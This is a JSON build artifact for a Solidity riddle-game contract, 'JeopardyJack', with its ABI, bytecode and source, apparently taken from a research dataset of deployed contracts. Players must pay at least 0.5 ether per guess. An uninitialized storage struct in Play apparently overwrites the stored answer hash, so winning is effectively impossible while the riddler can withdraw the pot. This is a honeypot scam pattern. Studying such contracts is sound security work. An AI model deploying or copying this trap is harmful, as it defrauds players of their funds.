{
  "contractName": "JeopardyJack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Answer",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "Riddle",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "Guesses",
      "outputs": [
        {
          "name": "player",
          "type": "address"
        },
        {
          "name": "guess",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_riddle",
          "type": "string"
        },
        {
          "name": "_answerHash",
          "type": "bytes32"
        }
      ],
      "name": "Start",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "guess",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_answer",
          "type": "string"
        }
      ],
      "name": "End",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610af0806100206000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631be160031461007a5780631e5d1a4c1461010a5780634f065672146101735780635ce398c4146101dd578063648f0bde1461026d578063675b7fc8146102c9575b005b34801561008657600080fd5b5061008f6103a2565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100cf5780820151818401526020810190506100b4565b50505050905090810190601f1680156100fc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561011657600080fd5b50610171600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610440565b005b6101db600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610517565b005b3480156101e957600080fd5b506101f26105c7565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610232578082015181840152602081019050610217565b50505050905090810190601f16801561025f5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102c7600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610665565b005b3480156102d557600080fd5b506102f4600480360381019080803590602001909291905050506108ad565b604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200180602001828103825283818151815260200191508051906020019080838360005b8381101561036657808201518184015260208101905061034b565b50505050905090810190601f1680156103935780820380516001836020036101000a031916815260200191505b50935050505060405180910390f35b60048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104385780601f1061040d57610100808354040283529160200191610438565b820191906000526020600020905b81548152906001019060200180831161041b57829003601f168201915b505050505081565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156105145780600490805190602001906104ac929190610998565b5060006001819055503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610512573d6000803e3d6000fd5b505b50565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156105c35733600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600390805190602001906105af929190610998565b508060008160001916905550426001819055505b5050565b60038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561065d5780601f106106325761010080835404028352916020019161065d565b820191906000526020600020905b81548152906001019060200180831161064057829003601f168201915b505050505081565b60008060015411801561068057506706f05b59d3b200003410155b151561068b57600080fd5b60008251141561069a576108a9565b338160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550818160010190805190602001906106f5929190610998565b50600281908060018154018082558091505090600182039060005260206000209060020201600090919290919091506000820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600182018160010190805460018160011615610100020316600290046107b2929190610a18565b5050505060005460001916826040518082805190602001908083835b6020831015156107f357805182526020820191506020810190506020830392506107ce565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206000191614156108a8578160049080519060200190610840929190610998565b5060006001819055503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156108a6573d6000803e3d6000fd5b505b5b5050565b6002818154811015156108bc57fe5b90600052602060002090600202016000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690806001018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561098e5780601f106109635761010080835404028352916020019161098e565b820191906000526020600020905b81548152906001019060200180831161097157829003601f168201915b5050505050905082565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106109d957805160ff1916838001178555610a07565b82800160010185558215610a07579182015b82811115610a065782518255916020019190600101906109eb565b5b509050610a149190610a9f565b5090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10610a515780548555610a8e565b82800160010185558215610a8e57600052602060002091601f016020900482015b82811115610a8d578254825591600101919060010190610a72565b5b509050610a9b9190610a9f565b5090565b610ac191905b80821115610abd576000816000905550600101610aa5565b5090565b905600a165627a7a72305820917be4909915a5ab140d510ef4572d6902ce9e2344b22524c4d0b326a6acd5270029",
  "source": "\n\ncontract JeopardyJack {\n    bytes32 private answerHash;\n    uint private isActive;\n    Guess[] public Guesses;\n    string public Riddle;\n    string public Answer;\n\n    struct Guess { address player; string guess; }\n    address private riddler;\n\n    function () payable public {}\n    \n    function Start(string _riddle, bytes32 _answerHash) public payable {\n        if (riddler == 0x0) {\n            riddler = msg.sender;\n            Riddle = _riddle;\n            answerHash = _answerHash;\n            isActive = now;\n        }\n    }\n\n    function Play(string guess) public payable {\n        require(isActive > 0 && msg.value >= 0.5 ether);\n        if (bytes(guess).length == 0) return;\n        \n        Guess newGuess;\n        newGuess.player = msg.sender;\n        newGuess.guess = guess;\n        Guesses.push(newGuess);\n\n        if (keccak256(guess) == answerHash) {\n            Answer = guess;\n            isActive = 0;\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function End(string _answer) public {\n        if (msg.sender == riddler) {\n            Answer = _answer;\n            isActive = 0;\n            msg.sender.transfer(this.balance);\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x656610729fc13e8283d96aa69cdf56c112222951/contracts/0x656610729fc13e8283d96aa69cdf56c112222951.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:56:09.400Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}